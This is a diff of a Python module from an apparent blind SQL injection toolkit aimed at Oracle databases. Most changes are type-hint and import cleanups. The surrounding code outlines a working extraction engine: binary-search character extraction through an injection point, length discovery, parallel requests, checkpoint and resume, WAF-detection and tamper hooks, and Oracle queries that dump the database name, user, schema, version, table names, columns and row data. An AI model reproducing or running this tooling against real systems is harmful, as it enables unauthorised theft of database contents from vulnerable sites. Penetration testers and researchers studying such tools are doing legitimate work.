@@ -18,32 +18,24 @@ Enterprise-grade blind SQL injection extraction engine supporting:
 import json
 import logging
 import math
+import threading
 import time
+from collections import deque
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass, field
-from datetime import datetime, timedelta
+from datetime import datetime
 from enum import Enum
 from pathlib import Path
 from typing import (
     Any,
-    Dict,
-    List,
-    Optional,
-    Set,
-    Tuple,
-    Union,
-    Generator,
-    AsyncGenerator,
 )
-from collections import deque
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import threading
 
 import requests
 
-from .blind_boolean import OracleBlindBooleanEngine, BlindBooleanResult
-from .blind_time import OracleTimeBlindEngine, TimeBlindResult
-from .oracle_schema import OracleSchemaEnumerator
+from .blind_boolean import OracleBlindBooleanEngine
+from .blind_time import OracleTimeBlindEngine
 from .oracle_database import OracleDatabaseEnumerator
+from .oracle_schema import OracleSchemaEnumerator
 from .oracle_version import OracleVersionFingerprinter
 from .tamper_engine import TamperEngine
 from .waf_detector import WAFDetector
@@ -103,22 +95,22 @@ class BlindExtractionResult:
     """
 
     success: bool = False
-    strategy_used: Optional[ExtractionTechnique] = None
+    strategy_used: ExtractionTechnique | None = None
     characters_extracted: int = 0
     requests_sent: int = 0
     elapsed_time: float = 0.0
     confidence: float = 0.0
     extracted_value: Any = None
-    errors: List[str] = field(default_factory=list)
+    errors: list[str] = field(default_factory=list)
     progress: float = 0.0
     estimated_remaining: float = 0.0
-    start_time: Optional[datetime] = None
-    end_time: Optional[datetime] = None
-    checkpoint_path: Optional[str] = None
-    metadata: Dict[str, Any] = field(default_factory=dict)
+    start_time: datetime | None = None
+    end_time: datetime | None = None
+    checkpoint_path: str | None = None
+    metadata: dict[str, Any] = field(default_factory=dict)
     status: ExtractionStatus = ExtractionStatus.NOT_STARTED
 
-    def to_dict(self) -> Dict[str, Any]:
+    def to_dict(self) -> dict[str, Any]:
         """Convert result to dictionary."""
         return {
             "success": self.success,
@@ -142,7 +134,7 @@ class BlindExtractionResult:
         """Get a human-readable summary."""
         status = "Success" if self.success else "Failed"
         summary = [
-            f"Blind Extraction Summary:",
+            "Blind Extraction Summary:",
             f"  Status: {status}",
             f"  Technique: {self.strategy_used.value if self.strategy_used else 'N/A'}",
             f"  Characters Extracted: {self.characters_extracted}",
@@ -170,13 +162,13 @@ class ExtractionCheckpoint:
     target_type: str
     target_name: str
     position: int
-    extracted_data: List[Any]
+    extracted_data: list[Any]
     charset: CharacterSet
     query_count: int
     progress: float
-    metadata: Dict[str, Any] = field(default_factory=dict)
+    metadata: dict[str, Any] = field(default_factory=dict)
 
-    def to_dict(self) -> Dict[str, Any]:
+    def to_dict(self) -> dict[str, Any]:
         """Convert checkpoint to dictionary."""
         return {
             "timestamp": self.timestamp.isoformat(),
@@ -192,7 +184,7 @@ class ExtractionCheckpoint:
         }
 
     @classmethod
-    def from_dict(cls, data: Dict[str, Any]) -> "ExtractionCheckpoint":
+    def from_dict(cls, data: dict[str, Any]) -> "ExtractionCheckpoint":
         """Create checkpoint from dictionary."""
         return cls(
             timestamp=datetime.fromisoformat(data["timestamp"]),
@@ -221,8 +213,8 @@ class BlindExtractor:
         session: requests.Session,
         base_url: str,
         injection_point: str,
-        logger: Optional[logging.Logger] = None,
-        checkpoint_dir: Optional[str] = "checkpoints",
+        logger: logging.Logger | None = None,
+        checkpoint_dir: str | None = "checkpoints",
         max_workers: int = 5,
         default_timeout: float = 30.0,
         default_delay: float = 1.0,
@@ -286,12 +278,12 @@ class BlindExtractor:
 
         # State
         self.extraction_result = BlindExtractionResult()
-        self.current_checkpoint: Optional[ExtractionCheckpoint] = None
+        self.current_checkpoint: ExtractionCheckpoint | None = None
         self._is_extracting = False
         self._stop_requested = False
         self._lock = threading.Lock()
-        self._query_cache: Dict[str, str] = {}
-        self._character_cache: Dict[str, str] = {}
+        self._query_cache: dict[str, str] = {}
+        self._character_cache: dict[str, str] = {}
 
         # Character sets
         self._character_sets = self._initialize_character_sets()
@@ -319,7 +311,7 @@ class BlindExtractor:
             logger.addHandler(ch)
         return logger
 
-    def _initialize_character_sets(self) -> Dict[CharacterSet, List[int]]:
+    def _initialize_character_sets(self) -> dict[CharacterSet, list[int]]:
         """Initialize character sets."""
         return {
             CharacterSet.ASCII: list(range(32, 128)),
@@ -342,7 +334,7 @@ class BlindExtractor:
             f"[BlindExtractor] Custom charset set: {len(custom_chars)} chars"
         )
 
-    def _get_charset(self) -> List[int]:
+    def _get_charset(self) -> list[int]:
         """Get the current character set."""
         return self._character_sets.get(
             self.charset, self._character_sets[CharacterSet.ASCII_PRINTABLE]
@@ -353,8 +345,8 @@ class BlindExtractor:
     # ============================================================
 
     def extract_character(
-        self, query: str, position: int, technique: Optional[ExtractionTechnique] = None
-    ) -> Tuple[Optional[str], float]:
+        self, query: str, position: int, technique: ExtractionTechnique | None = None
+    ) -> tuple[str | None, float]:
         """
         Extract a single character using blind injection.
 
@@ -399,7 +391,7 @@ class BlindExtractor:
 
     def _binary_search_character(
         self, query: str, position: int, min_code: int = 32, max_code: int = 126
-    ) -> Tuple[Optional[str], float]:
+    ) -> tuple[str | None, float]:
         """
         Extract character using binary search (7 queries vs 95 for ASCII).
 
@@ -457,7 +449,7 @@ class BlindExtractor:
                     result_char = mid
 
             except Exception as e:
-                self.logger.warning(f"[BlindExtractor] Binary search failed: {str(e)}")
+                self.logger.warning(f"[BlindExtractor] Binary search failed: {e!s}")
                 return None, 0.0
 
         # Return the found character
@@ -473,7 +465,7 @@ class BlindExtractor:
 
     def _linear_search_character(
         self, query: str, position: int, technique: ExtractionTechnique
-    ) -> Tuple[Optional[str], float]:
+    ) -> tuple[str | None, float]:
         """
         Extract character using linear search through character set.
 
@@ -516,7 +508,7 @@ class BlindExtractor:
 
             except Exception as e:
                 self.logger.warning(
-                    f"[BlindExtractor] Search failed for char {char_code}: {str(e)}"
+                    f"[BlindExtractor] Search failed for char {char_code}: {e!s}"
                 )
                 continue
 
@@ -526,9 +518,9 @@ class BlindExtractor:
         self,
         query: str,
         max_length: int = 255,
-        technique: Optional[ExtractionTechnique] = None,
+        technique: ExtractionTechnique | None = None,
         min_confidence: float = 80.0,
-    ) -> Tuple[Optional[str], float]:
+    ) -> tuple[str | None, float]:
         """
         Extract a string using blind injection.
 
@@ -629,12 +621,10 @@ class BlindExtractor:
                     found_length = mid
 
             except Exception as e:
-                self.logger.warning(
-                    f"[BlindExtractor] Length discovery failed: {str(e)}"
-                )
+                self.logger.warning(f"[BlindExtractor] Length discovery failed: {e!s}")
                 return self._discover_length_fallback(query, max_length)
 
-        return found_length if found_length > 0 else 0
+        return max(0, found_length)
 
     def _discover_length_fallback(self, query: str, max_length: int) -> int:
         """
@@ -740,31 +730,31 @@ class BlindExtractor:
     # SPECIFIC EXTRACTION METHODS
     # ============================================================
 
-    def extract_database_name(self) -> Tuple[Optional[str], float]:
+    def extract_database_name(self) -> tuple[str | None, float]:
         """Extract the database name."""
         self.logger.info("[BlindExtractor] Extracting database name")
         query = "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual"
         return self.extract_string(query, 255)
 
-    def extract_current_user(self) -> Tuple[Optional[str], float]:
+    def extract_current_user(self) -> tuple[str | None, float]:
         """Extract the current database user."""
         self.logger.info("[BlindExtractor] Extracting current user")
         query = "SELECT USER FROM dual"
         return self.extract_string(query, 255)
 
-    def extract_current_schema(self) -> Tuple[Optional[str], float]:
+    def extract_current_schema(self) -> tuple[str | None, float]:
         """Extract the current schema."""
         self.logger.info("[BlindExtractor] Extracting current schema")
         query = "SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM dual"
         return self.extract_string(query, 255)
 
-    def extract_version(self) -> Tuple[Optional[str], float]:
+    def extract_version(self) -> tuple[str | None, float]:
         """Extract the database version."""
         self.logger.info("[BlindExtractor] Extracting version")
         query = "SELECT banner FROM v$version WHERE ROWNUM = 1"
         return self.extract_string(query, 255)
 
-    def extract_table_names(self, max_tables: int = 50) -> List[Tuple[str, float]]:
+    def extract_table_names(self, max_tables: int = 50) -> list[tuple[str, float]]:
         """Extract table names from the current schema."""
         self.logger.info("[BlindExtractor] Extracting table names")
 
@@ -789,7 +779,7 @@ class BlindExtractor:
 
     def extract_column_names(
         self, table_name: str, max_columns: int = 30
-    ) -> List[Tuple[str, float]]:
+    ) -> list[tuple[str, float]]:
         """Extract column names from a table."""
         self.logger.info(f"[BlindExtractor] Extracting columns from {table_name}")
 
@@ -814,8 +804,8 @@ class BlindExtractor:
         return results
 
     def extract_table_data(
-        self, table_name: str, columns: List[str], max_rows: int = 100
-    ) -> List[Dict[str, Any]]:
+        self, table_name: str, columns: list[str], max_rows: int = 100
+    ) -> list[dict[str, Any]]:
         """Extract data from a table."""
         self.logger.info(f"[BlindExtractor] Extracting data from {table_name}")
 
@@ -857,8 +847,8 @@ class BlindExtractor:
         query: str,
         start_position: int,
         end_position: int,
-        technique: Optional[ExtractionTechnique] = None,
-    ) -> Dict[int, Tuple[Optional[str], float]]:
+        technique: ExtractionTechnique | None = None,
+    ) -> dict[int, tuple[str | None, float]]:
         """Extract characters in parallel."""
         self.logger.info(
             f"[BlindExtractor] Parallel extraction: {start_position}-{end_position}"
@@ -885,7 +875,7 @@ class BlindExtractor:
                     results[position] = (char, confidence)
                 except Exception as e:
                     self.logger.error(
-                        f"[BlindExtractor] Parallel extraction failed at {position}: {str(e)}"
+                        f"[BlindExtractor] Parallel extraction failed at {position}: {e!s}"
                     )
                     results[position] = (None, 0.0)
 
@@ -904,7 +894,7 @@ class BlindExtractor:
     # CHECKPOINT AND RESUME
     # ============================================================
 
-    def save_checkpoint(self) -> Optional[str]:
+    def save_checkpoint(self) -> str | None:
         """Save extraction checkpoint."""
         if not self.checkpoint_dir:
             return None
@@ -941,10 +931,10 @@ class BlindExtractor:
             return str(checkpoint_file)
 
         except Exception as e:
-            self.logger.error(f"[BlindExtractor] Failed to save checkpoint: {str(e)}")
+            self.logger.error(f"[BlindExtractor] Failed to save checkpoint: {e!s}")
             return None
 
-    def load_checkpoint(self, checkpoint_path: str) -> Optional[ExtractionCheckpoint]:
+    def load_checkpoint(self, checkpoint_path: str) -> ExtractionCheckpoint | None:
         """Load checkpoint from file."""
         try:
             with open(checkpoint_path, "r") as f:
@@ -957,7 +947,7 @@ class BlindExtractor:
             return checkpoint
 
         except Exception as e:
-            self.logger.error(f"[BlindExtractor] Failed to load checkpoint: {str(e)}")
+            self.logger.error(f"[BlindExtractor] Failed to load checkpoint: {e!s}")
             return None
 
     def resume_extraction(self, checkpoint_path: str) -> BlindExtractionResult:
@@ -1001,8 +991,8 @@ class BlindExtractor:
     # ============================================================
 
     def track_progress(
-        self, total_items: int, current_item: int, start_time: Optional[datetime] = None
-    ) -> Dict[str, Any]:
+        self, total_items: int, current_item: int, start_time: datetime | None = None
+    ) -> dict[str, Any]:
         """Track extraction progress with ETA."""
         if total_items <= 0:
             return {"progress": 0.0, "eta": None, "items_remaining": 0, "speed": 0.0}
@@ -1057,7 +1047,7 @@ class BlindExtractor:
         self._character_cache.clear()
         self.logger.info("[BlindExtractor] Cache cleared")
 
-    def get_statistics(self) -> Dict[str, Any]:
+    def get_statistics(self) -> dict[str, Any]:
         """Get extraction statistics."""
         return {
             "technique": (
